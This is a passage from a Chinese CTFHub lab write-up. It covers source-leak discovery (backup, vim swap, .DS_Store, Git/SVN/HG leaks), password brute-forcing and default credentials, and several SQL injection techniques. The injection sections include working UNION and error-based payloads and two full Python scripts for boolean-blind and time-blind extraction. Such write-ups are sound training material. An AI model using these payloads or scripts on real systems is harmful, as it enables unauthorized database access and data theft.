r=requests.get(url_final)</span><br><span class="line">        <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>

<h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>打开URL有：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154080.png" alt="1"></p>
<p>使用dirsearch扫描文件</p>
<p>在dirsearch目录执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-b2eb848d1933d253.sandbox.ctfhub.com:10800 -e * -x 502,503</span><br></pre></td></tr></table></figure>

<p>等待扫描完成发现有index.php.bak文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154858.png" alt="2"></p>
<p>直接下载.bak文件打开发现flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154439.png" alt="flag"></p>
<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><h4 id="法一-dirsearch"><a href="#法一-dirsearch" class="headerlink" title="法一:dirsearch"></a>法一:dirsearch</h4><p>打开URL得到提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154166.png" alt="1"></p>
<p>使用dirsearch扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800 -e swp -x 502,503</span><br></pre></td></tr></table></figure>

<p>主动选择.swp的后缀是因为-e *默认不包括swp文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154664.png" alt="2"></p>
<p>下载index.php.swp后放入linux中使用vim打开</p>
<p>先使用mv将index.php.swp改名为.index.php.swp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv index.php.swp .index.php.swp</span><br></pre></td></tr></table></figure>

<p>再使用vim打开index.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154013.png" alt="3"></p>
<p>按R选择恢复得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154710.png" alt="flag"></p>
<h4 id="法二-直接访问"><a href="#法二-直接访问" class="headerlink" title="法二:直接访问"></a>法二:直接访问</h4><p>由题目可得要求得到vim缓存文件</p>
<p>故直接访问.index.php.swp(swp,swo,swn)</p>
<p>得到index.php.swp文件后同法一</p>
<h4 id="法三-curl（未成功）"><a href="#法三-curl（未成功）" class="headerlink" title="法三:curl（未成功）"></a>法三:curl（未成功）</h4><p>可以直接使用curl命令查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800/.index.php.swp</span><br></pre></td></tr></table></figure>

<p>但出现问题：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154095.png" alt="4"></p>
<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><h4 id="法一-dirsearch-linux查看"><a href="#法一-dirsearch-linux查看" class="headerlink" title="法一:dirsearch+linux查看"></a>法一:dirsearch+linux查看</h4><p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153541.png" alt="1"></p>
<p>得到.DS_Store文件，丢到浏览器下载后在linux内打开</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153667.png" alt="2"></p>
<p>在看到.txt文件，丢到浏览器中打开得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153584.png" alt="flag"></p>
<h4 id="法二-dirsearch-python-dsstore查看"><a href="#法二-dirsearch-python-dsstore查看" class="headerlink" title="法二:dirsearch+python dsstore查看"></a>法二:dirsearch+python dsstore查看</h4><p>同法一，得到DS_Store</p>
<p>将得到的文件用dsstore打开</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153738.png" alt="3"></p>
<p>得到.txt文件</p>
<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151130.png" alt="1"></p>
<p>看到有.git文件夹，用githack下下来（仅支持python2）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 Githack.py http://challenge-b4001d8a6ccbd18d.sandbox.ctfhub.com:10800/.git</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151227.png" alt="2"></p>
<p>去到.git同级目录，输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p>查看之前对仓库的操作，发现第二次添加了flag，考虑恢复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git diff HEAD^</span><br></pre></td></tr></table></figure>

<p>得到历史文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152579.png" alt="3"></p>
<p>查看.txt文件得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152969.png" alt="flag"></p>
<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="法一：git-differ"><a href="#法一：git-differ" class="headerlink" title="法一：git differ"></a>法一：git differ</h4><p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152466.png" alt="1"></p>
<p>发现.git，用hackgit抓下来，得到.git文件夹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152801.png" alt="2"></p>
<p>进入.git&#x2F;refs，查看stash文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152478.png" alt="3"></p>
<p>在gtihash中对比一下，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152396.png" alt="flag"></p>
<h4 id="法二：git-stash-pop"><a href="#法二：git-stash-pop" class="headerlink" title="法二：git stash pop"></a>法二：git stash pop</h4><p>得到.git文件夹后，直接查看stash</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152860.png" alt="5"></p>
<p>执行<code>git stash pop</code>发现弹出文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152563.png" alt="6"></p>
<p>查看该文件得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152465.png" alt="flag-2"></p>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150785.png" alt="1"></p>
<p>看到有.git文件，用githack抓出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\GitHack.py http://challenge-241983fae914b573.sandbox.ctfhub.com:10800/.git`</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150576.png" alt="2"></p>
<p>进入目录直接看到.txt文件，打开得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150144.png" alt="flag"></p>
<h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>dirsearch扫出来有.svn目录，用dvcs-ripper找一下svn</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148622.png" alt="1"></p>
<p>进入.svn目录（隐藏文件夹，要用ls -a查看），在pristine目录中有两个文件夹，找到旧版的（08）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148364.png" alt="2"></p>
<p>cat查看文件得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148693.png" alt="flag"></p>
<h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>dirsearch开扫发现有.hg残留，在kali中用dvcs-ripper找一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148718.png" alt="1"></p>
<p>发现部分404，但是在store-fncache中仍有文件显示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148457.png" alt="2"></p>
<p>拼接url+flag得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148992.png" alt="flag"></p>
<h1 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>burp里抓包登陆请求，发送到爆破模组里</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134978.png" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134686.png" alt="2"></p>
<p>选上下面的用户密码，用集束炸弹方式攻击</p>
<p>payload1,2分别使用简单的弱口令</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152135801.png" alt="3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136869.png" alt="4"></p>
<p>选中长度排序，得到爆破成功的的对应密码，查看response得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136843.png" alt="flag"></p>
<h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><p>打开是网关登陆界面，还有验证码，那就没法用intruder爆破密码了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190031447.png" alt="image-20221019003140324"></p>
<p>随便试一个账号密码，显示用户不存在</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190032401.png" alt="image-20221019003216381"></p>
<p>查看源代码发现是“亿邮邮件网关”，结合title的“默认口令”，试一下是否是出厂的默认设置</p>
<p>直接搜该网关的管理用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190034857.png" alt="image-20221019003431841"></p>
<p>丢进去登陆得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190035364.png" alt="image-20221019003507338"></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308082747549.png" alt="image-20230308082747549"></p>
<p>敲<code>1 and 1=1</code>不报错，<code>1 and 1=2</code>报错，说明整数注入，直接猜列数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by x</span><br></pre></td></tr></table></figure>

<p>x为数字</p>
<p>当x&#x3D;3时报错，说明只有两列</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083107879.png" alt="image-20230308083107879"></p>
<p>联合查询，让查询的id&#x3D;-1，使得前面<code>select * from news where id=1</code>错误，回显后面的union字段</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083202386.png" alt="image-20230308083202386"></p>
<p>查到当前数据库名为sqli</p>
<p>继续爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083452750.png" alt="image-20230308083452750"></p>
<p>得到sqli的库中两个表为flag和news</p>
<p>查flag表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083655706.png" alt="image-20230308083655706"></p>
<p>拿flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,flag from sqli.flag</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083728106.png" alt="image-20230308083728106"></p>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>输入<code>1&#39;</code>报错而<code>1&quot;</code>不报错，说明本次用的是<code>&#39;</code>分割</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by x #</span><br></pre></td></tr></table></figure>

<p>查列数</p>
<p>x&#x3D;3报错</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090536133.png" alt="image-20230308090536133"></p>
<p>联合查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,database() #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090612874.png" alt="image-20230308090612874"></p>
<p>爆出库名，继续爆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27; #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090757323.png" alt="image-20230308090757323"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091240197.png" alt="image-20230308091240197"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,flag from sqli.flag #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091314140.png" alt="image-20230308091314140"></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>先order by找一下列数</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091711580.png" alt="image-20230308091711580"></p>
<p>报错注入可以用<code>updatexml(1,2,3)</code>函数，当第二个参数含特殊符号时报错，同时将第二个参数的内容显示在报错信息里</p>
<p>特殊符号用0x7e -&gt; ~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database()),3)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092106795.png" alt="image-20230308092106795"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;)),3)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092458129.png" alt="image-20230308092458129"></p>
<p>得到sqli库中两个表：flag，news</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select * from sqli.flag)),3)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092916770.png" alt="image-20230308092916770"></p>
<p>此时仅显示了前一部分的flag，原因是updatexml函数最多只能显示32位字符的长度，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select * from sqli.flag),20,32)),3)</span><br></pre></td></tr></table></figure>

<p>查到了第20-32位的flag</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308093231337.png" alt="image-20230308093231337"></p>
<p>拼起来就得到了完整flag</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>关键点是if判断：	</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。</span><br></pre></td></tr></table></figure>

<p>利用substr函数，截取字符串（库名、表名、数据）并放入expr1中进行判断，从而得出正确值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(substr(database(),1,1)=&#x27;s&#x27;,1,(select table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309083311747.png" alt="image-20230309083311747"></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309083339235.png" alt="image-20230309083339235"></p>
<p>显然，数据库的第一个字符为s</p>
<p>有python脚本遍历</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="built_in">input</span>(<span class="string">&#x27;输入url:\n&#x27;</span>)</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():<span class="comment">#查库名</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#数据库名限制为64字符，但一般小于9，为了效率</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:<span class="comment">#linux下mysql应该是对大小写敏感的，而windows则不</span></span><br><span class="line">			url = urlOPEN+<span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)</span><br><span class="line">			r = requests.get(url)</span><br><span class="line">			<span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">				database_name = database_name+i</span><br><span class="line">				<span class="built_in">print</span>(database_name)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>,database_name)</span><br><span class="line"></span><br><span class="line">get_database_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():<span class="comment">#查表名</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#看前四个表</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#一般来说表的最大长度有64</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url = urlOPEN+<span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table_list.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_list)</span><br><span class="line"></span><br><span class="line">get_table_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():<span class="comment">#查列</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>): <span class="comment">#判断列里最多有4个字段</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>): <span class="comment">#判断一个字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name=name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_list.append(name)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;column_name:&#x27;</span>,column_list)</span><br><span class="line"></span><br><span class="line">get_column_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#判断一个值最多有51个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">126</span>):<span class="comment">#ascii48-126对应的数字+英文+&#123;,&#125;,|</span></span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    flag=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;flag:&#x27;</span>,flag)</span><br><span class="line">    </span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309093514036.png" alt="image-20230309093514036"></p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>方法和布尔盲注类似，利用if判断，但需要引入sleep()函数，从是否执行sleep()函数来判断if条件是否成立</p>
<p>例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(length(database())&gt;=2,sleep(1),1)</span><br></pre></td></tr></table></figure>

<p>如果数据库名字大于等于二，则返回时间应该大于1</p>
<p>脚本与布尔盲注的脚本类似，只不过需要引入time库</p>
<p>由于网络环境的波动，一般要跑三次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="built_in">input</span>(<span class="string">&#x27;输入url:\n&#x27;</span>)</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():<span class="comment">#查库名</span></span><br><span class="line">    <span class="keyword">global</span> database_name</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#数据库名限制为64字符，但一般小于9，为了效率</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:<span class="comment">#linux下mysql应该是对大小写敏感的，而windows则不</span></span><br><span class="line">            url = urlOPEN+<span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(j,i)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            t = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                database_name = database_name+i</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>,database_name)</span><br><span class="line"></span><br><span class="line">get_database_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():<span class="comment">#查表名</span></span><br><span class="line">    <span class="keyword">global</span> table_list</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#看前四个表</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#一般来说表的最大长度有64</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url = urlOPEN+<span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(k,j,i)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                t = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                    name = name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table_list.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_list)</span><br><span class="line"></span><br><span class="line">get_table_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():<span class="comment">#查列</span></span><br><span class="line">    <span class="keyword">global</span> column_list</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>): <span class="comment">#判断列里最多有4个字段</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>): <span class="comment">#判断一个字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(k,j,i)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                t = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                    name=name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_list.append(name)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;column_name:&#x27;</span>,column_list)</span><br><span class="line"></span><br><span class="line">get_column_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#判断一个值最多有51个字符组成</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">126</span>):<span class="comment">#ascii48-126对应的数字+英文+&#123;,&#125;,|</span></span><br><span class="line">            url=urlOPEN+<span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,sleep(1),1)&#x27;</span> %(j,i)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            t = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;flag:&#x27;</span>,flag)</span><br><span class="line">    </span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>

<p>还是用sqlmap吧，够没脑子的</p>
<h2 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h2><p>本质就是整数型注入</p>
<p>用<code>1 and 1=1</code>判断出，然后union select 联合注入即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from news where id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095151777.png" alt="image-20230310095151777"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;fddqhlosgo&#x27;</span><br></pre></td></tr></table></figure>

